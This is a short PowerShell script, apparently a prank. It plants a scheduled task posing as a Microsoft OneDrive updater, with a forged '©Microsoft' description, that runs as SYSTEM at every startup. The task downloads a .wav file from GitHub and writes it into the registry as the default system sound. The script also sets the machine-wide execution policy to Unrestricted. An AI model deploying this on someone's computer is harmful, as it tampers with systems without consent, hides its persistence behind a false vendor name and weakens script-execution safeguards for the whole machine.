New-Item -ItemType Directory -Force -Path C:\temp

Remove-Item -Path C:\temp\onedrive-updater.ps1
Add-Content -Path C:\temp\onedrive-updater.ps1 -Value @"
Invoke-WebRequest -Uri "https://github.com/ethanbayliss/rads/raw/main/doo.wav" -OutFile "C:\temp\doo.wav"

(New-Object -ComObject WScript.Shell).RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\.Default\.Current\","c:\temp\doo.wav","REG_SZ")
"@

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force

$trigger = New-JobTrigger -AtStartup -RandomDelay 00:30:00
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File "C:\temp\onedrive-updater.ps1"'
$principal = New-ScheduledTaskPrincipal -UserId SYSTEM -LogonType ServiceAccount -RunLevel Highest

$definition = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Description "OneDrive Client Updater ©Microsoft"

Unregister-ScheduledTask -Name "onedrive-client-updater"
Register-ScheduledTask -TaskName "onedrive-client-updater" -InputObject $definition
